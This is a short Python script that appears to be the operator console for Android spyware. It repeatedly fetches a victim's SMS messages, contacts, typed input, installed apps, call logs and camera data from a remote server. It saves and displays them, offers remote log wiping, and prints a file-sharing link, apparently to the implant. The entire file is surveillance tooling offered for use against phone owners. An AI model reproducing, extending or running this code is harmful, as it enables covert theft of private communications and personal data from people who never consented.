import requests
import time
import os

RED = "\033[91m"
RESET = "\033[0m"

FILES = [
    "sms.txt",
    "contacts.txt",
    "inputted.txt",
    "installedapps.txt",
    "calls.txt",
    "camera.txt"
]

def fetch_files():
    base_url = "https://vmpx.top/tools/LiveFeeder/"
    connected = False

    print(RED + "Copy this: https://mega.nz/file/9VRlyRJZ#fLDmEYT2dJL9whDe61Fvk6QZWDSNdUTWm1DIbXmuJB4" + RESET)

    while True:
        all_data = []
        found_any = False

        if not connected:
            print(RED + "Connecting to android device..." + RESET)

        for filename in FILES:
            url = base_url + filename
            try:
                r = requests.get(url, timeout=5)
                if r.status_code == 200 and r.text.strip():
                    if not connected:
                        print(RED + "Connected to android device." + RESET)
                        print(RED + "Locating files..." + RESET)
                        connected = True
                    found_any = True
                    all_data.append(f"\n--- {filename} ---\n{r.text.strip()}")
            except Exception:
                pass

        if found_any:
            with open("info.txt", "w", encoding="utf-8") as f:
                f.write("\n".join(all_data))

            os.system("cls" if os.name == "nt" else "clear")
            print("\n".join(all_data))

         
            choice = input(RED + "\nLog found! Press 'c' to clear logs or Enter to continue: " + RESET).strip().lower()
            if choice == "c":
                for filename in FILES:
                    url = base_url + filename
                    try:
                        requests.post(url, data="") 
                    except Exception:
                        pass
                print(RED + "Logs cleared remotely!" + RESET)

        else:
            print("Waiting for logs...")

        time.sleep(5)


if __name__ == "__main__":
    try:
        fetch_files()
    except KeyboardInterrupt:
        print("\n" + RED + "Stopped by user." + RESET)
